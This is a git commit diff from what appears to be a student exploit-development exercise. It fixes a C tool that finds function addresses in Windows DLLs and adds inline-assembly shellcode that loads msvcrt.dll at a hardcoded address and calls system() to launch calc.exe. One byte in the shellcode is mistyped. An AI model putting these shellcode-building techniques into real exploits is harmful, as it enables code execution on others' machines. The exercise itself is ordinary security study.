e70aba230f2f00c3df4a16505f2b441fde90f8f9
Andres Solano rueda <asolano-@c1r9s1.42malaga.com>
2022-08-04 13:22:07 +0200

    Exploit finished

--- offset.c
+++ offset.c
@@ -2,30 +2,34 @@
 #include <windows.h>
 typedef VOID (*MYPROC)(LPTSTR);
 
-int main (int argc, char **argv)
-{
-	char dll[100];
-	char function[100];
+int main (int argc, char **argv) {
+    char dll[100];
+    char funcion[100];
 
-	HINSTANCE libreria;
-	MYPROC procadd;
+    HINSTANCE libreria;
+    MYPROC procadd;
 
-	printf("Busca offsets. Inrtoduce como primer argumento el nombre de la DLL\n");
-	printf("y como segundo argumento la función dentro de la DLL\n");
-	print("Por ejemplo %s msvcrt.dll system\n\n", argv[0]);
+    printf ("Busca offsets xDD. Introduce como primer argumento el nombre de la DLL,\n");
+    printf ("y como segundo argumento la función dentro de esa DLL\n");
+    printf ("Por ejemplo %s msvcrt.dll system\n\n", argv[0]);
 
-	if (argc != 3)
-	{
-		printf ("Introduce 2 argumentos\n");
-		return (1);
-	}
-	memset(dll, 0, sizeof(dll));
-	memset(funcion, argv[2], strlen(argv[2]));
+    if (argc != 3){
+        printf ("Introduce 2 argumentos como se explica mas arriba!!!\n");
+        return 1;
+        }
 
-	libreria = LoadLibrary(dll);
-	procadd = (MYPROC)GetProcAdress (libreria, fucnion);
+    memset(dll,0,sizeof(dll));
+    memset(funcion,0,sizeof(funcion));
 
-	printf("Offset de %s en la DLL %s es %x", funcion, dll, proadd);
+    memcpy (dll, argv[1], strlen(argv[1]));
+    memcpy (funcion, argv[2], strlen(argv[2]));
 
-	return (0);
+    libreria = LoadLibrary(dll);
+    procadd = (MYPROC)GetProcAddress (libreria,funcion);
+
+    printf ("Offset de %s en la DLL %s es %x", funcion, dll, procadd);
+
+    return 0;
+
 }
+//Da como resultado al ejecutar offset.exe msvcrt.dll system -> 77c293c7
--- shellcode.c
+++ shellcode.c
@@ -3,25 +3,45 @@
 
 int main()
 {
-	LoadLibrary("msvcrt.dll");
 	_asm
 	{
 		push ebp
 		mov ebp,esp
 		xor edi,edi
 		push edi
-		sub esp,04h
+		sub esp,0ch
+		mov byte ptr [ebp-0bh],6dh
+		mov byte ptr [ebp-0ah],73h
+		mov byte ptr [ebp-09h],76h
 		mov byte ptr [ebp-08h],63h
-		mov byte ptr [ebp-07h],61h
-        mov byte ptr [ebp-06h],6Ch
-        mov byte ptr [ebp-05h],63h
-        mov byte ptr [ebp-04h],2Eh
-        mov byte ptr [ebp-03h],65h
-        mov byte ptr [ebp-02h],78h
-		mov byte ptr [ebp-01h],65h
-		lea eax,[ebp-08h]
+        mov byte ptr [ebp-07h],72h
+        mov byte ptr [ebp-06h],74h
+        mov byte ptr [ebp-05h],2Eh
+        mov byte ptr [ebp-04h],64h
+        mov byte ptr [ebp-03h],6ch
+		mov byte ptr [ebp-02h],6ch
+		lea eax,[ebp-0bh]
 		push eax
-		mov ebx,0x77bf8044
+		mov ebx,0x7c801d7b
+		call ebx
+		
+		push ebp
+		mov ebp,esp
+		xor edi,edi
+		push edi
+		sub esp,08h
+		mov byte ptr [ebp-09h],63h
+		mov byte ptr [ebp-08h],61h
+        mov byte ptr [ebp-07h],6Ch
+        mov byte ptr [ebp-06h],63h
+        mov byte ptr [ebp-05h],2Eh
+        mov byte ptr [ebp-04h],65b
+        mov byte ptr [ebp-03h],78h
+		mov byte ptr [ebp-02h],65h
+		lea eax,[ebp-09h]
+		push eax
+		mov ebx,0x77c293c7
 		call ebx
 	}
+
 }
